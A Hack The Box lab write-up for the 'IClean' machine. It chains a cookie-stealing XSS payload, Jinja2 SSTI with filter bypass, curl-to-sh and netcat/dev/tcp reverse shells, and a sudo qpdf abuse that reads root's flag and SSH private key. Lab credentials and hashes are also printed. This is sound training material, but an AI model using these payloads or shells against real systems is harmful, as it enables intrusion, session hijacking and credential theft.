---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - CrossSiteScripting
  - XSS
  - CookieStealing
  - AuthenticationBypass
  - ServerSideTemplateInjection
  - SSTI
  - MYSQL
  - Database
  - Hashes
  - qpdf
---

![](images/IClean.png)

## Summary

The box started with a `cleaner services` website on port `80/TCP` using `Python` as `backend`. By using `directory busting` a `/dashboard` can be found which matches the `Login` button on the main page and give the idea to check for `Cross-Site Scripting (XSS)` to `steal` a potential `cookie`. And indeed `XSS` can be achieved by injecting the payload in the `&service=` parameter on the `/quote` endpoint. The `cookie` allows to `bypass authentication` and access the `dashboard`. On the `dashboard` several `administrative tasks` can be performed. Keeping in mind that the application uses `Python` points directly to look for `Server-Side Template Injection (SSTI)`. And indeed after creating a `invoice`, `SSTI` can be found by using `Jinja2` payloads  on the `/QRGenerator` endpoint by entering the payloads to the `input field` which gets loaded after pasting the `Invoice ID`. For the foothold a `Jina2` payload with `filter bypass` capabilities then pops a `reverse shell` as `www-data`. As next step `credentials` to the `MYSQL database` can be found inside the `app.py` in the `landing directory`. The `database` then reveals a `hash` for the user `consuela` which can either be cracked or found within the `crackstation.net` collection. After the `privilege escalation` to `consuela` the `user.txt` is located in her `home directory`. For the `root part` the ability of `consuela` to execute `/usr/bin/qpdf` using `sudo` can be abused to read files in the `context` of `root` and to grab the `root.txt`. It is also possible to exfiltrate the `id_rsa` key of root.

## Table of Contents

- [Reconnaissance](#reconnaissance)
  - [Port Scanning](#port-scanning)
  - [Enumeration of Port 80/TCP](#enumeration-of-port-80tcp)
- [Directory Busting](#directory-busting)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [Cookie Stealing](#cookie-stealing)
- [Authentication Bypass](#authentication-bypass)
- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
- [Foothold](#foothold)
- [Stabilizing Shell](#stabilizing-shell)
- [Enumeration](#enumeration)
- [Database Enumeration](#database-enumeration)
- [Cracking the Hash](#cracking-the-hash)
- [Privilege Escalation to consuela](#privilege-escalation-to-consuela)
- [user.txt](#usertxt)
- [Enumeration](#enumeration)
- [Privilege Escalation to root](#privilege-escalation-to-root)
- [root.txt](#roottxt)
- [Post Exploitation](#post-exploitation)

## Reconnaissance

### Port Scanning

I started with the usual `Nmap` scan.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.43.86
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-06 15:05 EDT
Nmap scan report for 10.129.43.86
Host is up (0.095s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.50 seconds
```

### Enumeration of Port 80/TCP

We accessed port `80/TCP` and got redirected to `capiclean.htb` which we added to our `/etc/hosts` file.

- [http://10.129.43.86/](http://10.129.43.86/)

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.43.86    capiclean.htb
```

A quick look at the `app stack` showed `Python[3.10.12]` and `Werkzeug[2.3.7]` which could had been a hint to look for `Server-Side Template Injection (SSTI)`. We wrote that down for later.

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://capiclean.htb/
http://capiclean.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@capiclean.htb], HTML5, HTTPServer[Werkzeug/2.3.7 Python/3.10.12], IP[10.129.43.86], JQuery[3.0.0], Python[3.10.12], Script, Title[Capiclean], Werkzeug[2.3.7], X-UA-Compatible[IE=edge]
```

On the website itself was an option to `GET A QUOTE` which redirected us to some sort `job page` for hiring a `cleaner service`.

![](images/2024-04-06_15-09_quote.png)

![](images/2024-04-06_15-09_quote_submit.png)

## Directory Busting

While we kept investigating the main page, we started `directory busting` in the `background` and found an `/dashboard` endpoint.

```c
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://capiclean.htb/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_capiclean.htb/__24-04-06_15-08-27.txt

Target: http://capiclean.htb/

[15:08:27] Starting: 
[15:08:36] 200 -    5KB - /about                                            
[15:08:52] 302 -  189B  - /dashboard  ->  /                                 
[15:09:05] 200 -  711B  - /login                                            
[15:09:05] 302 -  189B  - /logout  ->  /                                    
[15:09:20] 403 -  278B  - /server-status/                                   
[15:09:20] 403 -  278B  - /server-status
[15:09:20] 200 -    8KB - /services                                         
                                                                             
Task Completed
```

## Cross-Site Scripting (XSS)

We checked all `three options` and entered a random `email address` on [http://capiclean.htb/quote](http://capiclean.htb/quote)and intercepted the request with `Burp Suite`.

![](images/2024-04-06_15-09_quote_submit_burpsuite.png)

Next we checked if the application was vulnerable to `Cross-Site Scripting (XSS)` for which we injected the following payload as the `&service=` parameter and `URL encoded` it by pressing `Ctrl+u`.

#### Basic payload

```c
<img src="http://10.10.14.7">
```

#### URL encoded payload

```c
service=Carpet+Cleaning&service=Tile+%26+Grout&service=<img+src%3d"http%3a//10.10.14.7">&email=foobar%40foobar.local
```

After forwarding the modified request, we received a callback on our local listener and confirmed `XSS` on the `website`.

![](images/2024-04-06_15-09_quote_submit_burpsuite_payload.png)

```c
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.43.86 - - [06/Apr/2024 15:13:53] "GET / HTTP/1.1" 200 -
```

## Cookie Stealing

Since the main page showed a button to `login page`, we grabbed a basic payload to `steal a cookie` via `XSS` which we also `URL encoded` using the same shortcut as before.

#### Basic payload

```c
<img src=x onerror="location.href='http://10.10.14.7/?c='+ document.cookie">
```

#### URL encoded payload

```c
service=Carpet+Cleaning&service=Tile+%26+Grout&service=<img+src%3dx+onerror%3d"location.href%3d'http%3a//10.10.14.7/%3fc%3d'%2b+document.cookie">&email=foobar%40foobar.local
```

And again, after forwarding it through `Repeater` it only took a few seconds to receive the `callback` containing a `cookie`.

![](images/2024-04-06_15-09_quote_submit_burpsuite_cookie.png)

```c
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.43.86 - - [06/Apr/2024 15:17:34] "GET /?c=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhA2MQ.nmIecDtr4qqL4NkEqlqguxYz6K0 HTTP/1.1" 200 -
```

| Name    | Value                                                                                         |
| ------- | --------------------------------------------------------------------------------------------- |
| session | eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhA2MQ.nmIecDtr4qqL4NkEqlqguxYz6K0 |

## Authentication Bypass

We set the `cookie` and accessed `/dashboard` which showed some kind of `administrative tasks` like `generate an invoice` or `generate a QR code`.

- [http://capiclean.htb/dashboard](http://capiclean.htb/dashboard)

![](images/2024-04-06_15-20_admin_dashboard.png)

## Server-Side Template Injection (SSTI)

First we created a `invoice` as reference which provided us a `Invoice ID`.

- [http://capiclean.htb/InvoiceGenerator](http://capiclean.htb/InvoiceGenerator)

![](images/2024-04-06_15-20_admin_dashboard_invoice.png)

| Invoice ID |
| ---------- |
| 9913741737 |

With the `Invoice ID` we moved to `Generate QR` and inserted it to make the website load another `submission form` which expected a `link` to a `scanable invoice`. We noticed that the website not redirected us nor reload itself so `Server-Side Template Injection (SSTI)` had to be the next step for gaining foothold.

![](images/2024-04-06_15-20_admin_dashboard_qrcode_invoice.png)

![](images/2024-04-06_15-20_admin_dashboard_qrcode_invoice_next_step.png)

We injected a basic payload right after a URL pointing to our local machine.

#### Payload

```c
http://10.10.14.7">{{7*7}}
```

![](images/2024-04-06_15-20_admin_dashboard_qrcode_invoice_next_step_payload.png)

After submitting our payload we found ourselves on the `/QRGenerator` endpoint with a freshly generated invoice an and the `bottom right corner` we could see that our payload got `rendered` by spotting the `49`.

![](images/2024-04-06_15-20_admin_dashboard_ssti_output.png)

## Foothold

For the foothold we tried a few payload which got filtered and we ended up with the following `filter bypass` for `Jinja2` which called a `staged payload` to execute a `reverse shell`.

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass)

```c
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('curl http://10.10.14.7/x|sh')|attr('read')()}}
```

- [https://www.revshells.com/](https://www.revshells.com/)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/iClean/serve]
└─$ cat x
irm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.7 9001 >/tmp/f
```

![](images/2024-04-06_15-39_burp_suite_payload.png)

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.7] from (UNKNOWN) [10.129.43.86] 45936
bash: cannot set terminal process group (1218): Inappropriate ioctl for device
bash: no job control in this shell
www-data@iclean:/opt/app$
```
[HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#filter-bypasses) also has a useful payload for the bypass.
The following payload executes a command in base64, but the output is not visible:
```
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
```

## Stabilizing Shell

We stabilized our shell as usual.

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.7] from (UNKNOWN) [10.129.43.86] 45936
bash: cannot set terminal process group (1218): Inappropriate ioctl for device
bash: no job control in this shell
www-data@iclean:/opt/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@iclean:/opt/app$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9001

www-data@iclean:/opt/app$ 
www-data@iclean:/opt/app$ export XTERM=xterm
www-data@iclean:/opt/app$
```

## Enumeration

Since we got a shell as `www-data` we always start by `enumerating the folder` our shell got spawned in.

```c
www-data@iclean:/opt/app$ ls -la
total 32
drwxr-xr-x 4 root root  4096 Mar  2 07:29 .
drwxr-xr-x 3 root root  4096 Sep 21  2023 ..
-rw-r--r-- 1 root root 12553 Mar  2 07:29 app.py
drwxr-xr-x 6 root root  4096 Sep 27  2023 static
drwxr-xrwx 2 root root  4096 Apr  6 19:40 templates
```

And right of the bed we found some `database credentials` located in `app.py`.

```c
www-data@iclean:/opt/app$ cat app.py 
from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
from flask import render_template_string
import pymysql
import hashlib
import os
import random, string
import pyqrcode
from jinja2 import StrictUndefined
from io import BytesIO
import re, requests, base64

app = Flask(__name__)

app.config['SESSION_COOKIE_HTTPONLY'] = False

secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
<--- CUT FOR BREVITY --->
```

| Username | Password     | Database  |
| -------- | ------------ | --------- |
| iclean   | pxCsmnGLckUb | capiclean |

A quick check of the locally running service showed a `MYSQL database` on port `3306/TCP` as expected.

```c
www-data@iclean:/opt/app$ ss -tulpn
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                           
udp   UNCONN 0      0            0.0.0.0:59167      0.0.0.0:*                                     
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*                                     
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*                                     
udp   UNCONN 0      0        224.0.0.251:5353       0.0.0.0:*                                     
udp   UNCONN 0      0            0.0.0.0:5353       0.0.0.0:*                                     
udp   UNCONN 0      0               [::]:45251         [::]:*                                     
udp   UNCONN 0      0               [::]:5353          [::]:*                                     
tcp   LISTEN 0      128        127.0.0.1:3000       0.0.0.0:*    users:(("python3",pid=1218,fd=4))
tcp   LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*                                     
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                     
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*                                     
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                     
tcp   LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*                                     
tcp   LISTEN 0      10         127.0.0.1:44177      0.0.0.0:*                                     
tcp   LISTEN 0      128             [::]:22            [::]:*
```

## Database Enumeration

We logged in and started enumerating the available `databases` and `tables`. Since we already knew the name of the `database`, this was pretty straight forward.

```c
www-data@iclean:/opt/app$ mysql -u iclean -ppxCsmnGLckUb
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4951
Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

```c
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| capiclean          |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)
```

```c
mysql> use capiclean;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```c
mysql> show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)
```

And we ended up finding some `hashes` by pulling them from the `users table`.

```c
mysql> select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
2 rows in set (0.00 sec)
```

| Username | Hash                                                             |
| -------- | ---------------------------------------------------------------- |
| consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa |

## Cracking the Hash

The hash of `concuela` is crackable but since `crackstation.net` is our best friend, we got the password from there.

- [https://crackstation.net/](https://crackstation.net/)

| Password         |
| ---------------- |
| simple and clean |

## Privilege Escalation to consuela

I switched to `consuela` by simply using `su` but login via `SSH` also worked on the box.

```c
www-data@iclean:/opt/app$ su consuela
Password: 
consuela@iclean:/opt/app$
```

## user.txt

And we got the `user.txt` in the `home directory` of `consuela`.

```c
consuela@iclean:~$ cat user.txt
fe4ea45e9c20e9f0a3b49f1e18dbff50
```

## Enumeration

Basic enumeration in the `context` of `consuela` showed that she was able to execute `/usr/bin/qpdf` using `sudo`.

```c
consuela@iclean:~$ id
uid=1000(consuela) gid=1000(consuela) groups=1000(consuela)
```

```c
consuela@iclean:~$ sudo -l
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

## Privilege Escalation to root

The quickest way to grab the `root.txt` was by forcing `qpdf` to reading it and to print a random `.pdf` file.

- [https://qpdf.readthedocs.io/en/stable/cli.html](https://qpdf.readthedocs.io/en/stable/cli.html)

```c
consuela@iclean:~$ sudo /usr/bin/qpdf @/root/root.txt out.pdf
[sudo] password for consuela: 
qpdf: open ac892fa75bff3c762e3d67dabfd447d8: No such file or directory
```

## root.txt

```c
ac892fa75bff3c762e3d67dabfd447d8
```

## Post Exploitation

Since only getting the `root.txt` is never enough we put a little bit effort in reading a potential `SSH Key` in the `home directory` of `root` and got lucky indeed.

- [https://qpdf.readthedocs.io/_/downloads/en/stable/pdf/](https://qpdf.readthedocs.io/_/downloads/en/stable/pdf/ )

```c
consuela@iclean:/tmp$ sudo /usr/bin/qpdf --empty --add-attachment /root/.ssh/id_rsa --mimetype=text/plain -- root.pdf
```

```c
consuela@iclean:/tmp$ sudo /usr/bin/qpdf --list-attachments root.pdf
id_rsa -> 5,0
```

```c
consuela@iclean:/tmp$ sudo /usr/bin/qpdf --show-attachment=id_rsa root.pdf
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Shout-out to `ar0x` and `Crow` for different techniques on how to exfiltrate the `id_rsa` key!
